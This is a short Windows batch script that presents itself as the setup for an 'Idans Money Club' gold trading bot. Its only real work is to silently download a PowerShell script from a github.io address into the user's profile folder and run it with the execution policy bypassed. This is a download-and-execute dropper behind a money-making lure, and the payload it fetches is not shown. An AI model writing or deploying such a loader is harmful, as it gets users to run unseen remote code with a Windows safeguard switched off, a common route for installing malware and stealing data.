@echo off
title Idans Money Club - Gold Bot Setup
echo.
echo   ===== Idans Money Club - Gold Bot Setup =====
echo   Fetching the installer, one moment...
echo.
set "D=%USERPROFILE%\IdanClub"
if not exist "%D%" mkdir "%D%"
curl -s -L -o "%D%\club_setup.ps1" https://elkingo18.github.io/idan-signals/club/downloads/club_setup.ps1
if not exist "%D%\club_setup.ps1" (
  echo   Download failed. Check your internet connection and run this file again.
  pause
  exit /b 1
)
powershell -NoProfile -ExecutionPolicy Bypass -File "%D%\club_setup.ps1"
echo.
pause
